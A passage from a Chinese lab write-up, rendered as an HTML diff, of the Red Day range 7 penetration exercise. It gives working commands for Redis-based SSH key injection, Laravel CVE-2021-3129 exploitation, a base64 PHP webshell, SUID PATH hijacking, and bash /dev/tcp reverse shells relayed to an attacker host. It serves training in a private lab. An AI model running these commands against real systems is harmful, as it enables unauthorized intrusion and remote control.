+          <li class="md-nav__item">
+  <a href="#frp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        隧道持久化——级联 FRP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        端口转发持久化
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web1dmz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web1（DMZ）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pc1pc2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PC1/pc2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dc_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DC
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        遇到的问题
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="遇到的问题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网络连接问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        高版本哥斯拉连接问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        中文乱码问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        环境变量无法修改
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么已经有了明文账号密码还需要写入ssh公钥
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kalisshweb2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        在kali中ssh公钥认证登录web2失败
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        创建持久化服务时报错
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52web2ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        配置52网段代理持久化时连不上web2的ssh
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxychains4nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        使用proxychains4进行nmap扫描时失败
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="_1">红日靶场七<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="_3">网络拓扑<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li>DMZ区IP段为192.168.162.1/24</li>
+<li>第二层网络环境IP段为192.168.52.1/24</li>
+<li>第三层网络环境IP段为192.168.93.1/24</li>
+</ul>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-03-56.png" /></p>
+<h3 id="_4">网卡设置<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>配置三张网卡，在Vmware中新增三个虚拟网卡VMnet8、VMnet9、 VMnet10。</p>
+<ul>
+<li>VMnet8设为默认的NAT模式，IP段设为192.168.162.0/24</li>
+<li>VMnet9设为仅主机模式，IP段设为192.168.52.0/24</li>
+<li>VMnet10设为仅主机模式，IP段设为192.168.93.0/24</li>
+</ul>
+<h3 id="_5">主机配置<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>Web1配置了两个网卡，一个连接在VMnet8上可以对外提供服务；一个连接在VMnet9上连通第二层网络。
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-02.png" />
+   IP分别为192.168. 162.129和192.168.52.10
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-21.png" /></p>
+</li>
+<li>
+<p>Windows 7 (PC 1)配置了两个网卡，一个连接在VMnet9上连通第二层网，一个连接在VMnet10上连通第三层网络。 
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-42.png" />
+   ip地址为192.168.52.30和192.168.93.20 
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-57.png" /></p>
+</li>
+<li>
+<p>Web2和pc1一样配置了两个网卡，一个连接在VMnet9上连通第二层网络，一个连接在VMnet10上连通第三层网络。 
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-37-29.png" />
+   ip地址分别为192.168.52.20和192.168.93.10 </p>
+</li>
+<li>
+<p>Windows 7 (PC 2)只配置了一个网卡，连接在VMnet10上连通第三层网络
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-37-48.png" />
+   ip为192.168.93.40
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-38-06.png" /></p>
+</li>
+<li>
+<p>Windows Server 2012和PC 2只配置了一个网卡，一个连接在VMnet9上连通第三层网络。
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-38-49.png" />
+   ip 192.168.93.30 
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-39-06.png" /></p>
+</li>
+<li>
+<p>kali配置VMnet8（nat）网卡
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-39-43.png" />
+   ip为192.168.162.128
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-40-02.png" /></p>
+</li>
+</ol>
+<h3 id="_6">服务配置<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>DMZ区的 Ubuntu 需要启动nginx服务：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>redis-server /etc/redis.conf    #启动Redis
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>/usr/sbin/nginx -c /etc/nginx/nginx.conf #启动nginx
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>iptables -F      #清空防火墙规则
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-40-49.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-41-13.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-41-20.png" /></p>
+</li>
+<li>
+<p>第二层网络的 Ubuntu需要启动docker容器：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo service docker start
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sudo docker start 8e172820ac7
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-03.png" /></p>
+</li>
+<li>
+<p>第三层网络的 Windows 7 （PC 1）需要启动通达OA：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a> C:\MYOA\bin\AutoConfig.exe
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-32.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-39.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-44.png" /></p>
+</li>
+</ol>
+<h2 id="kalidmzweb1">外网kali——&gt;DMZ区Web1<a class="headerlink" href="#kalidmzweb1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>通过web1的Redis未授权访问向web1中/root/.ssh目录写入kali的ssh公钥，从而直接通过ssh连接获得web1的root权限</p>
+</blockquote>
+<h3 id="_7">外网主机探测<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p><strong>Kali中对192.168.162.0/24网段进行主机和端口探测</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Nmap -sn 192.168.162.0/24      # 探测存活主机
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-51-51.png" />
+探测到192.168.162.129这台主机存活</p>
+<p><strong>探测该主机开放的服务端口</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Namp -sV -sC -p- 192.168.162.129  #探测开放端口
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-52-13.png" />
+开放了22,80,81,6379端口</p>
+<p><em>利用点：6379 端口 (Redis)：Redis 2.8.17。这是一个非常老的版本，极大概率存在未授权访问漏洞。</em></p>
+<h3 id="_8">漏洞利用+权限维持<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>利用Redis 未授权访问漏洞拿 Web1 的 Root 权限</p>
+</blockquote>
+<p><strong>生成ssh秘钥对</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ssh-keygen -t rsa -f /root/.ssh/id_rsa_red7      # 生成 SSH 密钥对（一路回车，不用设置密码）
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa_red7.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/pubkey.txt          # 把公钥前后加上换行符，避免和 Redis 的二进制头混淆cat /tmp/pubkey.txt | redis-cli -h 192.168.162.129 -x set crackit         # 将公钥内容写入 Redis 的 key (命名为 crackit)
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-53-07.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-53-14.png" /></p>
+<p><strong>利用Redis未授权访问漏洞向目标主机写入ssh认证公钥</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>redis-cli -h 192.168.162.129        #  登录 Redis 交互界面
+</span></code></pre></div>
+向目标服务器的 /root/.ssh/ 目录中写入的 SSH 公钥，从而直接获取服务器的 root 权限。
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>config set dir /root/.ssh/
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>config set dbfilename authorized_keys
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>save
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Exit
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-55-01.png" /></p>
+<p><strong>使用刚刚生成的密钥对私钥认证，通过ssh连接目标服务器获取shell</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ssh -i /root/.ssh/id_rsa_red7 root@192.168.162.129
+</span></code></pre></div>
+成功获取web1的root权限
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-55-10.png" /></p>
+<h3 id="csweb1">CS监听Web1（直连）<a class="headerlink" href="#csweb1" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>在cs中创建http监听器</strong>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-23-15.png" /></li>
+<li></li>
+</ul>
+<h2 id="kaliweb2pc1">kali——&gt;二层web2、PC1<a class="headerlink" href="#kaliweb2pc1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>利用web1作为跳板机，设置代理转发，使kali能够访问到二层内网中的web2和pc1
+利用永恒之蓝（MS17-010）获取pc1的shell或者利用8080端口开放的http服务（通达OA系统）中的web漏洞获取shell
+利用Laravel框架漏洞（CVE-2021-3129）获取web2的shell</p>
+</blockquote>
+<h3 id="_9">设置代理转发<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p><strong>在 Kali 和 Web1 之间建立 SOCKS5 代理</strong>
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>ssh -D 9050 -f -N -i ~/.ssh/id_rsa_red7 root@192.168.162.129
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-00-26.png" />
+   验证代理是否生效：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>proxychains4 curl http://192.168.52.30:8080
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-00-29.png" /></p>
+<p><strong>开启kali中浏览器代理</strong>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-05-09.png" /></p>
+<p>验证代理是否生效：
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-10-19.png" />
+   成功在kali中访问到pc1</p>
+<h3 id="web2">web2<a class="headerlink" href="#web2" title="Permanent link">&para;</a></h3>
+<h4 id="_10">漏洞探测<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>nmap扫描开放端口
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nmap -sS -Pn -p- --min-rate 1000 192.168.52.20
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-52-18.png" />
+开放了22端口和8000端口</p>
+<p>访问8000端口看一下
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>proxychains4 curl http://192.168.52.20:8000
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-56-23.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-57-09.png" />
+发现使用的是laravel框架，而且是小于8.4.2的版本可能存在漏洞</p>
+<h4 id="_11">漏洞利用<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>Laravel Debug mode RCE（CVE-2021-3129）拿下web2的shell</p>
+</blockquote>
+<h5 id="msf">msf<a class="headerlink" href="#msf" title="Permanent link">&para;</a></h5>
+<p>msf查找对应的漏洞利用模块
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>search CVE-2021-3129
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-14-55.png" /></p>
+<p>尝试利用该漏洞
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>use exploit/multi/php/ignition_laravel_debug_rce
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>set RHOSTS 192.168.52.20
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>set LHOST 192.168.162.128
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>set Proxies socks5:127.0.0.1:9050
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>set ReverseAllowProxy true
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>set RPORT 8000
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>set ForceExploit true
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>run
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-18-50.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-47-28.png" />
+msf显示不存在可利用的漏洞，但有可能是误报，换个利用工具</p>
+<h5 id="secpros-teamlaravel-cve-2021-3129-exp">SecPros-Team/laravel-CVE-2021-3129-EXP<a class="headerlink" href="#secpros-teamlaravel-cve-2021-3129-exp" title="Permanent link">&para;</a></h5>
+<p><strong>该脚本需要配合 phpggc 工具使用，并且必须把脚本放到 phpggc 的同一个目录下运行，否则可能无法正常生成 payload</strong>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-49-55.png" /></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>proxychains python3 laravel-CVE-2021-3129-EXP.py http://192.168.52.20:8000
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-50-51.png" />
+利用成功，webshell地址:http://192.168.52.20:8000/fuckyou.php,密码:pass</p>
+<p><strong>使用哥斯拉连接</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>proxychains4 java -jar godzilla.jar  #让哥斯拉的流量走代理
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-41-46.png" />
+连接不成功，换了好几个版本都不行，修改laravel-CVE-2021-3129-EXP脚本</p>
+<blockquote>
+<p>核心思路是：利用 phpggc 生成一条恶意的序列化 POC，让目标服务器在触发漏洞时，顺便执行一段系统命令，这段命令负责下载并写入一个最新版（4.0）的哥斯拉木马。</p>
+</blockquote>
+<ul>
+<li>
+<p>第一步：准备 4.0.1 版本的木马
+   把最新版哥斯拉（4.0.1）生成的一句话木马（其实就是一段加密的 PHP 代码）转换成Base64 编码。
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-52-16.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-52-52.png" /></p>
+</li>
+<li>
+<p>第二步：利用 phpggc 生成反序列化 POC</p>
+</li>
+</ul>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>php<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;phar.readonly=0&quot;</span><span class="w"> </span>./phpggc<span class="w"> </span>Laravel/RCE5<span class="w"> </span><span class="s2">&quot;system(&#39;echo PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg== | base64 -d &gt; /var/www/html/shell.php&#39;);&quot;</span><span class="w"> </span>--phar<span class="w"> </span>phar<span class="w"> </span>-o<span class="w"> </span>php://output<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&quot;</span>
+</span></code></pre></div>
+   <em>PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg==</em>就是哥斯拉木马的base64编码格式
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-09-55.png" /></p>
+<p><strong>核心逻辑</strong></p>
+<ul>
+<li>它生成了一个 Laravel/RCE5 的反序列化链。这个链条里塞入了一段系统命令：system('echo [木马base64] | base64 -d &gt; /var/www/html/shell.php');。</li>
+<li>
+<p>一旦 Laravel 漏洞被触发，目标系统就会执行这段系统命令，把 Base64 还原成 4.0.1 版的哥斯拉木马，并保存到 /var/www/html/shell.php。后面的 python 代码则是把这个 POC 格式化成漏洞需要的特殊字符格式（=00）。</p>
+</li>
+<li>
+<p>第三步：修改 EXP 脚本</p>
+</li>
+</ul>
+<p>打开原来的漏洞利用 Python 脚本，找到专门负责写入木马/发送 POC 的地方，把脚本原本自带的 2.x 版木马 POC，替换成了刚才用 phpggc 生成的、可以写入 4.0 版木马的 POC。同时，把脚本里生成的木马文件名改成了 shell.php。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-11-00.png" />
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-12-20.png" /></p>
+<ul>
+<li>第四步：再次运行魔改后的exp脚本
+   按理说此时脚本会在目标网站上上传刚刚的哥斯拉木马，用最新版的哥斯拉（4.0.1）去连 http://192.168.52.20:8000/shell.php，应该会成功</li>
+</ul>
+<p>但是不知道什么原因这次脚本直接显示不存在漏洞，可能是我把脚本改坏了，我后面再研究研究</p>
+<h5 id="ajisai-babucve-2021-3129-exp">ajisai-babu/CVE-2021-3129-exp<a class="headerlink" href="#ajisai-babucve-2021-3129-exp" title="Permanent link">&para;</a></h5>
+<blockquote>
+<p>ajisai-babu 的脚本仓库链接是：https://github.com/ajisai-babu/CVE-2021-3129-exp</p>
+</blockquote>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>proxychains4 python3 CVE-2021-3129.py -u http://192.168.52.20:8000 --exp
+</span></code></pre></div>
+运行改脚本利用laravel反序列化漏洞向目标网站上传webshell</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-25-58.png" /></p>
+<p>蚁剑连接
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-21-24.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-27-58.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-29-02.png" />
+成功获得web2的低权限shell</p>
+<h4 id="_12">提权<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>suid+环境变量提权
+docker逃逸</p>
+</blockquote>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-57-41.png" />
+发现.dockerenv文件，说明这是docker容器环境，需要进行docker逃逸，当前shell权限位www-data低权限，需要先进行提权</p>
+<h5 id="suid">suid+环境变量提权<a class="headerlink" href="#suid" title="Permanent link">&para;</a></h5>
+<blockquote>
+<p>先查找有suid权限的可执行文件，尝试进行suid提权
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>find / -perm -4000 -type f 2&gt;/dev/null
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-02-18.png" />
+发现可疑文件/home/jobs/shell</p>
+</blockquote>
+<p><strong>对/home/jobs/shell文件进行分析</strong></p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-04-50.png" /></p>
+<p>64位可执行文件，属主是root，可以用来提权</p>
+<p><strong>进入/home/jobs/目录查看其他相关文件</strong>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-06-55.png" />
+demo.c可能是shell程序的源码</p>
+<p><strong>分析demo.c</strong>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-07-36.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-08-08.png" />
+直接运行shell程序发现启动了ps进程说明demo.c确实是shell的源码</p>
+<blockquote>
+<p>提权思路：shell程序拥有suid权限且属主为root，当运行shell程序时会以root权限启动进程，该程序会使用相对路径启动一个子进程ps，子进程继承父进程的权限（root），我们可以利用环境变量劫持将ps指向假的ps文件，从而获得一个以root权限启动的shell</p>
+</blockquote>
+<p><strong>创建一个假的ps文件</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>cd /tmp
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>echo &#39;/bin/bash&#39; &gt;ps
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>chmod 777 ps
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-32-49.png" /></p>
+<p><strong>启动反弹shell</strong></p>
+<p><em>在kali中的web1 shell中监听4488端口</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nc -lnvp 4488
+</span></code></pre></div></p>
+<p><em>在webshell中进行反向链接</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.52.10/4488 0&gt;&amp;1&#39;
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-14-03.png" /></p>
+<blockquote>
+<p>上述是在web1上获取的反向连接，另一种姿势是利用web1作为跳板机进行流量转发，最终在kali中建立反向连接</p>
+</blockquote>
+<p><em>在kali中监听4488端口</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>nc -lnvp 4488
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-21-57.png" /></p>
+<p><em>在web1 shell中进行流量转发</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>socat TCP4-LISTEN:5555,fork TCP4:192.168.162.128:4488
+</span></code></pre></div>
+- TCP4-LISTEN:5555：让跳板机监听自己的 5555 端口，等待别人连进来。</p>
+<ul>
+<li>
+<p>fork：允许多个连接同时进来，为每个连接创建一个新进程（保证稳定）。</p>
+</li>
+<li>
+<p>TCP4:192.168.162.128:4488：一旦收到数据，就立刻把数据转发到 Kali 机的 4488 端口</p>
+</li>
+</ul>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-23-00.png" /></p>
+<p><em>在webshell中进行反向链接</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.52.10/5555 0&gt;&amp;1&#39;
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-23-43.png" /></p>
+<p><strong>劫持环境变量</strong>
